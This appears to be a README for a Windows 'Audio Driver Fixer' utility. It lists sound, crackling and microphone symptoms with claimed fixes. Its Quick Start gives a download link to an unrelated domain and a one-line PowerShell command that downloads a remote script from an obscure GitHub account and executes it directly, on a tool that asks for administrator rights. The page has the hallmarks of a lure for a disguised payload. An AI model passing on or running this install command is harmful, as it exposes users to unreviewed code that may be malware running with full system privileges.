# Audio Driver Fixer

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.1.0-stable-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

Fix no sound, audio crackling, microphone issues, and driver errors on Windows.

---

### Quick Start

**[Download Latest Release](https://audio.nexustool.fun/)**

Or via PowerShell:
```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems This Fixes

### No Sound

| Symptom | Cause | Fix |
|---|---|---|
| No sound at all | Audio service stopped | Restarts Windows Audio + AudioEndpointBuilder |
| Sound icon shows **red X** | Audio device disabled or missing | Re-enables device, reinstalls driver |
| **"No Audio Output Device is installed"** | Driver missing or corrupted | Reinstalls audio driver from Windows Update |
| Sound stopped after **Windows Update** | Update broke audio driver | Rolls back driver to previous version |
| No sound from **headphones** (speakers work) | Wrong default device | Resets default audio device configuration |
| No sound in **specific apps** | App volume mixer issue | Resets per-app audio settings |

### Audio Quality Issues

| Symptom | Cause | Fix |
|---|---|---|
| **Crackling / popping** sounds | DPC latency or buffer issue | Optimizes audio buffer, fixes DPC latency |
| Sound is **distorted** | Wrong sample rate or bit depth | Resets audio format to optimal settings |
| **Buzzing / humming** noise | Ground loop or driver issue | Disables audio enhancements, resets driver |
| Volume **too low** even at max | Loudness equalization off | Enables loudness normalization |
| Audio **cuts out** randomly | Power management disabling device | Disables audio power saving |
| **Echo** or feedback | Recording device loopback | Fixes Stereo Mix / loopback settings |

### Microphone Issues

| Symptom | Cause | Fix |
|---|---|---|
| Microphone **not detected** | Driver missing or privacy setting | Reinstalls driver, enables mic privacy |
| Mic **too quiet** | Mic boost disabled | Adjusts mic level and boost settings |
| **"Your microphone is muted by system settings"** | App permission denied | Resets microphone privacy permissions |
| Mic works but **others can't hear me** in calls | Wrong default recording device | Sets correct default communication device |

---

## Preview

```
  +--------------------------------------------------+
  |          Audio Driver Fixer v1.1.0               |
  +--------------------------------------------------+
  |                                                  |
  |  Audio Devices:                                  |
  |  [!] Speakers (Realtek HD)    -- No driver       |
  |  [OK] HDMI Audio (NVIDIA)     -- Working         |
  |  [!] Microphone               -- Disabled        |
  |                                                  |
  |  Services:                                       |
  |  [!] Windows Audio            -- Stopped         |
  |  [OK] AudioEndpointBuilder    -- Running         |
  |                                                  |
  |  [ Fix All ]   [ Test Sound ]   [ Exit ]         |
  |                                                  |
  +--------------------------------------------------+
```

---

## Common Error Messages

| Error Message | Fix |
|---|---|
| **"No Audio Output Device is installed"** | Reinstalls audio driver, enables device |
| **"Audio services not responding"** | Restarts Windows Audio and AudioEndpointBuilder services |
| **"Windows Audio Endpoint Builder stopped"** | Repairs service dependencies, restarts service |
| **"Failed to play test tone"** | Resets audio format, reinstalls driver |
| **"Audio device is disabled"** | Re-enables in Sound settings and Device Manager |
| **"High Definition Audio Device - driver error"** | Reinstalls HD Audio driver |
| **"Realtek HD Audio Manager missing"** | Reinstalls Realtek driver with full components |
| **"Speaker not plugged in"** (but it is) | Resets jack detection, reinstalls driver |
| **"This device cannot start (Code 10)"** for audio | Removes and reinstalls audio controller |

---

## Supported Audio Hardware

**Realtek** HD Audio, ALC897, ALC1220, ALC256, ALC295 and all Realtek codecs.
**NVIDIA** HDMI/DisplayPort audio output.
**AMD** HDMI/DisplayPort audio output.
**Intel** Smart Sound, HDA, and integrated audio.
**USB** audio devices, DACs, headsets, microphones.
**Bluetooth** audio (A2DP, hands-free profile).
**Conexant, VIA, C-Media** and all other Windows-compatible audio devices.

---

## How It Works

1. **Scan** -- Detects all audio playback and recording devices
2. **Diagnose** -- Checks drivers, services, settings, and permissions
3. **Repair** -- Reinstalls drivers, restarts services, resets configuration
4. **Test** -- Plays test tone to confirm sound output is working

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## Common Scenarios

**Sound stopped working after Windows Update**
Windows updates frequently replace audio drivers with generic versions. This tool detects the issue and either rolls back or installs the correct manufacturer driver.

**New PC build, no sound**
Missing Realtek or motherboard audio drivers. The tool detects the audio chip and installs the appropriate driver.

**HDMI connected but no audio on TV/monitor**
Wrong default output device. The tool sets HDMI as default and enables audio output.

**Gaming headset microphone not working**
Privacy settings or wrong default communication device. The tool fixes both.

---

## FAQ

**Does it support Realtek?**
Yes. Realtek is the most common audio chip on PCs and this tool has full support for all Realtek codecs.

**Will it fix Bluetooth audio issues?**
Yes, for driver and pairing issues. Hardware problems with the Bluetooth adapter itself require manufacturer support.

**Is it safe?**
The tool uses Windows Device Manager APIs and standard driver installation methods. No system files are patched.

**I have no sound at all -- speakers, headphones, nothing works.**
Run the tool as Administrator. It will check the Windows Audio service first, then drivers, then hardware detection.

---

## License

[MIT](LICENSE)
